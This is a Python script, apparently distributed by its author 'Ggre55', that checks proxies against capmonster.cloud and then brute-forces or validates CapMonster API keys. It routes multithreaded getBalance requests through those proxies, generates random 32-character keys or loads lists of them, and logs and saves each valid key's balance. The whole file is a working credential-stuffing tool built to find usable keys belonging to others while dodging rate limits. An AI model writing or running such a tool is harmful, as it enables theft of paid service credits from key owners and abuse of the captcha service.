# Import required libraries
import threading
import queue
import requests
import random
import string
import logging, json
from colorama import Fore, init
import os
from json import JSONDecodeError
from requests.exceptions import HTTPError
from requests.exceptions import ProxyError, SSLError, HTTPError


def clear_screen():
    """Clear the console screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

# Initialize colorama
init(autoreset=True)

# Initialize logging
logging.basicConfig(filename='_Ggre55_capmonster_tool.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Initialize queues for proxies and keys
proxy_queue = queue.Queue()
key_queue = queue.Queue()

# Function to save valid proxies
def save_valid_proxy(proxy):
    with open('valid_proxies.txt', 'a+') as f:
        f.write(f"{proxy}\n")


# # Function to check if a proxy is valid
# def check_proxy():
#     while not proxy_queue.empty():
#         proxy = proxy_queue.get()
#         try:
#             response = requests.get('https://capmonster.cloud', proxies={'http': proxy, 'https': proxy}, timeout=5)
#             if response.status_code == 200:
#                 logging.info(f'[Valid Proxy] {proxy}')
#                 print(Fore.GREEN + f"[Valid Proxy] {proxy}")
#                 save_valid_proxy(proxy)  # Save the valid proxy
#             else:
#                 logging.error(f'[Invalid Proxy] {proxy}')
#                 print(Fore.RED + f"[Invalid Proxy] {proxy}")
#         except requests.Timeout:
#             logging.error(f'[Timeout] {proxy}')
#             print(Fore.YELLOW + f"[Timeout] {proxy}")
#         except requests.RequestException as e:
#             logging.error(f'[Request Error] {proxy} - {e}')
#             print(Fore.RED + f"[Request Error] {proxy} - {e}")
#         except Exception as e:
#             logging.error(f'[Unknown Error] {proxy} - {e}')
#             print(Fore.MAGENTA + f"[Unknown Error] {proxy} - {e}")
#         proxy_queue.task_done()




# Function to check if a proxy is valid
def check_proxy():
    while not proxy_queue.empty():
        proxy = proxy_queue.get()
        try:
            response = requests.get('https://capmonster.cloud', 
                                    proxies={'http': proxy, 'https': proxy}, 
                                    timeout=5, 
                                    verify=False)  # Disable SSL verification (not recommended for production)
            if response.status_code == 200:
                logging.info(f'[Valid Proxy] {proxy}')
                print(Fore.GREEN + f"[Valid Proxy] {proxy}")
                save_valid_proxy(proxy)  # Save the valid proxy
            else:
                logging.error(f'[Invalid Proxy] {proxy}')
                print(Fore.RED + f"[Invalid Proxy] {proxy}")
        except ProxyError:
            logging.error(f'[Proxy Error] {proxy}')
            print(Fore.YELLOW + f"[Proxy Error] {proxy}")
        except SSLError:
            logging.error(f'[SSL Error] {proxy}')
            print(Fore.YELLOW + f"[SSL Error] {proxy}")
        except HTTPError as e:
            logging.error(f'[HTTP Error] {proxy} - {e}')
            print(Fore.RED + f"[HTTP Error] {proxy}")
        except Exception as e:
            logging.error(f'[Unknown Error] {proxy} - {e}')
            print(Fore.MAGENTA + f"[Unknown Error] {proxy}")
        proxy_queue.task_done()

# Function to generate a random CapMonster-like key
def generate_key(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# # Function to check if a CapMonster key is valid
# def check_key():
#     while not key_queue.empty():
#         key = key_queue.get()
#         try:
#             # Make an API call to CapMonster
#             response = requests.get(f'https://api.capmonster.cloud/check_key?key={key}', timeout=5).json()
#             if response['status'] == 'success':  # Replace 'status' and 'success' with actual response keys
#                 logging.info(f'[Valid Key] {key}')
#                 print(f"[Valid Key] {key}")
#             else:
#                 logging.error(f'[Invalid Key] {key}')
#                 print(f"[Invalid Key] {key}")
#         except Exception as e:
#             logging.error(f'[Error] {key} - {e}')
#             print(f"[Error] {key} - {e}")
#         key_queue.task_done()

# Function to save API response
def save_api_response(response, key):
    with open(f'api_response_{key}.json', 'w') as f:
        json.dump(response, f, indent=4)

# Function to check if a CapMonster key is valid and also check its balance
def check_key(proxy):
    while not key_queue.empty():
        key = key_queue.get()
        try:
            payload = json.dumps({"clientKey": key})
            headers = {'Content-Type': 'application/json'}

            # Making a POST request to get balance with a proxy
            response = requests.post('https://api.capmonster.cloud/getBalance', 
                                     headers=headers, data=payload, timeout=5, 
                                     proxies={'http': proxy, 'https': proxy})
            response.raise_for_status()  # Will raise HTTPError for bad responses
            response_data = response.json()
        
            # Save the full API response
            save_api_response(response_data, key)

            # Extracting balance from the response
            balance = response_data.get("balance", None)

            if balance is not None:  # Replace with your actual validation logic
                logging.info(f'[Valid Key] {key} - Balance: {balance} - Full Response: {json.dumps(response_data, indent=4)}')
                print(Fore.GREEN + f"[Valid Key] {key} - Balance: {balance}\nFull Response: {json.dumps(response_data, indent=4)}")
            else:
                logging.error(f'[Invalid Key] {key} - Full Response: {json.dumps(response_data, indent=4)}')
                print(Fore.RED + f"[Invalid Key] {key}\nFull Response: {json.dumps(response_data, indent=4)}")
        except HTTPError as e:
            if e.response.status_code == 401:
                logging.error(f'[Unauthorized] {key} - 401 Unauthorized.')
                print(Fore.YELLOW + f"[Unauthorized] {key} - 401 Unauthorized.\n")
            else:
                logging.error(f'[HTTP Error] {key} - {e}')
                print(Fore.RED + f"[HTTP Error] {key}  - Check log file\n")
        except JSONDecodeError:
            logging.error(f'[JSON Decode Error] {key} - Invalid or empty JSON response.')
            print(Fore.YELLOW + f"[JSON Decode Error] {key} - Invalid or empty JSON response.\n")
        except requests.RequestException as e:
            logging.error(f'[Request Error] {key} - {e}')
            print(Fore.RED + f"[Request Error] {key}  - Check log file\n")
        except Exception as e:
            logging.error(f'[Unknown Error] {key} - {e}')
            print(Fore.MAGENTA + f"[Unknown Error] {key}  - Check log file\n")
            
        key_queue.task_done()



# Function to load items into a queue from a file
def load_items_to_queue(file_path, item_queue):
    try:
        with open(file_path, 'r') as f:
            items = f.readlines()
        for item in items:
            item_queue.put(item.strip())
    except FileNotFoundError:
        print("File not found. Please try again.")
        exit(1)


banner = f"""{Fore.CYAN}
   ______            __  ___                 __               ________              __            
  / ____/___ _____  /  |/  /___  ____  _____/ /____  _____   / ____/ /_  ___  _____/ /_____  _____
 / /   / __ `/ __ \/ /|_/ / __ \/ __ \/ ___/ __/ _ \/ ___/  / /   / __ \/ _ \/ ___/ //_/ _ \/ ___/
/ /___/ /_/ / /_/ / /  / / /_/ / / / (__  ) /_/  __/ /     / /___/ / / /  __/ /__/ ,< /  __/ /    
\____/\__,_/ .___/_/  /_/\____/_/ /_/____/\__/\___/_/      \____/_/ /_/\___/\___/_/|_|\___/_/     
          /_/           {Fore.RESET}{Fore.RED}BY Ggre55 {Fore.RESET}{Fore.GREEN}V1.2 {Fore.RESET}                                                                          
                        {Fore.YELLOW}Telegram: @DrWoop {Fore.RESET}
                        {Fore.YELLOW}Store: ggre55store.itch.io {Fore.RESET}
"""

# Main function for user interface and functionality
def main():
    # Clear the console screen for better readability
    clear_screen()
    print(f"{banner}")
    print("                     1. Check Proxies")
    print("                     2. Check Keys")
    print("            ---------------------------------- ")
    option = input("    * Select an option: ").strip()

    if option == '1':
        proxy_file = input("Enter path to proxy file: ").strip()
        # try:
        #     os.remove('valid_proxies.txt')
        # except FileNotFoundError:
        #     print(Fore.YELLOW + "No existing 'valid_proxies.txt' to remove.")
        # # ... (existing code)
        load_items_to_queue(proxy_file, proxy_queue)
        num_threads = int(input("Enter number of threads: ").strip())
        for _ in range(num_threads):
            thread = threading.Thread(target=check_proxy)
            thread.start()
        proxy_queue.join()
    elif option == '2':
        # Load valid proxies
        try:
            with open('valid_proxies.txt', 'r') as f:
                valid_proxies = f.readlines()
            print(f"Loaded {len(valid_proxies)} valid proxies.")  # Debug print
        except FileNotFoundError:
            print("No valid proxies found. Please check proxies first(option 1).")
            return
        
        # Load or generate keys
        key_file = input("Enter path to key file (leave empty to generate keys): ").strip()
        if key_file:
            load_items_to_queue(key_file, key_queue)
        else:
            num_keys = int(input("Enter the number of keys to generate: ").strip())
            for _ in range(num_keys):
                key_queue.put(generate_key())
        
        print(f"Loaded {key_queue.qsize()} keys.")  # Debug print

        num_threads = int(input("Enter number of threads: ").strip())
        
        # Start threads using valid proxies for key checking
        for proxy in valid_proxies:
            for _ in range(num_threads):
                thread = threading.Thread(target=check_key, args=(proxy.strip(),))
                thread.start()
        key_queue.join()

    else:
        print("Invalid option. Please try again.")
        exit(1)

    print("=== Task Completed ===")
    
# Run the main function
if __name__ == '__main__':
    main()



#Made by ggre55
